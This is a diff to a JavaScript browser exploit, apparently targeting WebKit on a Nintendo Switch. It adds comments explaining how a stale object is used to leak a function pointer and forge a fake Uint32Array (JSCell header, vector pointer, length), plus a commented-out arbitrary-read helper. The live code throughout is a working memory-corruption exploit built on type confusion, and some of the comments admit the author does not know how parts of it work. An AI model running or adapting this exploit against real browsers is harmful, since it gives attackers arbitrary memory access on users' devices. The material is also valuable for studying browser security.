@@ -190,17 +190,27 @@ function dgc() {
 	 
  	for (i = 0; i < bufs.length; i++) {
  		for (k = 0; k < bufs[0].length; k++) {
- 			if (bufs[i][k] == 0x41414242) { // Check if this is what the stale object points to (0x4141414 + 0x101 == 0x41414242)
+			// Check if this is what the stale object points to (0x4141414 + 0x101 == 0x41414242)
+			// If this is true then stale[0] points to the same thing as bufs[i][k]
+ 			if (bufs[i][k] == 0x41414242) { 
  				// Leak function pointer
 				stale[0] = fc;
  				fcp = bufs[i][k];
 				
-				
+				// Make a fake Uint32Array
  				stale[0] = {
+					// 'a' is the forged JSCell header
+					// m_structureID = 105 // Struct ID for Uint32ArrayType (Changes on runtime, how did this work?)
+					// m_indexingType = 0x0
+					// m_type = 0x26 // Assumingly Uint32ArrayType on the version of webkit this was made on.
+					// m_flags = 0x72
+					// m_gcData (or m_cellState?) = 0x11
  					'a': u2d(105, 0x1172600),
- 					'b': u2d(0, 0),
- 					'c': smsh,
- 					'd': u2d(0x100, 0)
+					
+					// 'b' - 'd' are the forged JSArrayBufferView
+ 					'b': u2d(0, 0),		// butterfly ptr (Does this exist on the version of wk the switch is using?)
+ 					'c': smsh,		// void* m_vector
+ 					'd': u2d(0x100, 0)	// uint32_t m_length;
  				}
  				stale[1] = stale[0]
 				
@@ -223,6 +233,13 @@ function dgc() {
  				mem1 = bck;
  				mem2 = smsh;
  				bufs.push(stale)
+				/*
+				 function read4(addr) {
+ 					mem0[4] = addr;
+ 					var ret = mem2[0];
+ 					mem0[4] = mem1;
+ 					return ret;
+				 }*/
  				if (smsh.length != 0x10) {
  					smashed(stale[0]);
  				}
